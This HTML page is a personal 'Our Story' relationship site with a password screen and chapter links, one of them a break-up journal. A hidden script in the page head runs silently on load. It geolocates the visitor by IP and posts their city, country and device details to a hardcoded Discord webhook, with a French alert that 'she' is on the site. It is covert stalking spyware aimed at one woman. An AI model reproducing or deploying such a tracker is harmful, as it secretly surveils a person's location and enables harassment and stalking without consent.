<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Our Story</title>
    <link rel="stylesheet" href="style.css">
</head>
<script>
  if (!localStorage.getItem('admin_view')) {
    const webhookURL = "https://discord.com/api/webhooks/1500222826773348353/KPNKAKnthbbeUHNRlPZg8tiAGiQ6GLAM_ubxZb6jyzmYAWmPDOGssKGIbzra5Bab0Iwf";
    
    // On récupère les détails techniques
    const device = navigator.userAgent;

    // On récupère la localisation via une API externe
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        const locationInfo = data.city && data.country_name 
          ? `${data.city}, ${data.country_name}` 
          : "Localisation inconnue";

        fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: "@everyone 👁️ Elle est sur le site",
            embeds: [{
              title: "Détails de la connexion 🌸",
              color: 0xff0000,
              fields: [
                {
                  name: "📍 Localisation",
                  value: "```" + locationInfo + "```",
                  inline: false
                },
                {
                  name: "📱 Appareil & Navigateur",
                  value: "```" + device + "```",
                  inline: false
                }
              ],
              footer: { text: "Signal détecté à l'instant" },
              timestamp: new Date().toISOString()
            }]
          })
        });
      })
      .catch(err => {
        // Si la localisation échoue, on envoie quand même le ping de base
        console.error('Erreur localisation, envoi du ping simple');
        fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: "@everyone 👁️ Elle est sur le site (Localisation échouée)",
            embeds: [{
              title: "Détails de la connexion 🌸",
              color: 0xff0000,
              fields: [{ name: "📱 Appareil", value: "```" + device + "```" }],
              timestamp: new Date().toISOString()
            }]
          })
        });
      });
  }
</script>
<body>

    <div id="login-screen">
        <div class="password-content">
            <h2>Access</h2>
            <p class="hint">(Hint: It's my phone code)</p>
            <input type="password" id="passwordField" inputmode="numeric">
            <button id="unlockBtn">Unlock</button>
            <p id="error-message">Wrong code.</p>
        </div>
    </div>

    <div id="main-story" style="display: none;" class="with-bg">
        <header class="story-header">
            <h1>Our Journey</h1>
            <p>Every step we took together.</p>
        </header>

        <div class="stats-container">
            <div class="stat-group">
                <span class="stat-label">Since we met : </span>
                <div class="stat-values">
                    <div class="stat-unit"><span id="met-days">0</span>d</div>
                    <div class="stat-unit"><span id="met-hours">0</span>h</div>
                    <div class="stat-unit"><span id="met-mins">0</span>m</div>
                </div>
            </div>
            
            <div class="stat-group">
                <span class="stat-label">Since our story began : </span>
                <div class="stat-values">
                    <div class="stat-unit"><span id="together-days">0</span>d</div>
                    <div class="stat-unit"><span id="together-hours">0</span>h</div>
                    <div class="stat-unit"><span id="together-mins">0</span>m</div>
                </div>
            </div>
        </div>

        <div class="container">
            <a href="chapter1.html" class="chapter-link">
                <section class="story-card">
                    <div class="category-tag">Chapter 1</div>
                    <h3>Day Zero</h3>
                </section>
            </a>

            <a href="chapter2.html" class="chapter-link">
                <section class="story-card">
                    <div class="category-tag">Chapter 2</div>
                    <h3>Late Night Whispers</h3>
                </section>
            </a>

            <a href="chapter3.html" class="chapter-link">
                <section class="story-card">
                    <div class="category-tag">Chapter 3</div>
                    <h3>The Point of No Return</h3>
                </section>
            </a>

            <a href="chapter4.html" class="chapter-link">
                <section class="story-card">
                    <div class="category-tag">Chapter 4</div>
                    <h3>The Relation</h3>
                </section>
            </a>

            <a href="music.html" class="chapter-link">
                <section class="story-card">
                    <div class="category-tag">Playlist</div>
                    <h3>Songs</h3>
                </section>
            </a>

            <a href="reflections.html" class="chapter-link">
                <section class="story-card">
                    <div class="category-tag">Reflections</div>
                    <h3>Borrowed Words</h3>
                </section>
            </a>

            <a href="journal.html" class="chapter-link">
                <section class="story-card">
                    <div class="category-tag">Journal</div>
                    <h3>My Break Up Journal</h3>
                </section>
            </a>

            <a href="today.html" class="chapter-link">
                <section class="story-card">
                    <div class="category-tag">Today</div>
                    <h3>The Present Chapter</h3>
                </section>
            </a>
        </div>
    </div>

    <script src="script.js"></script>

</body>
</html>
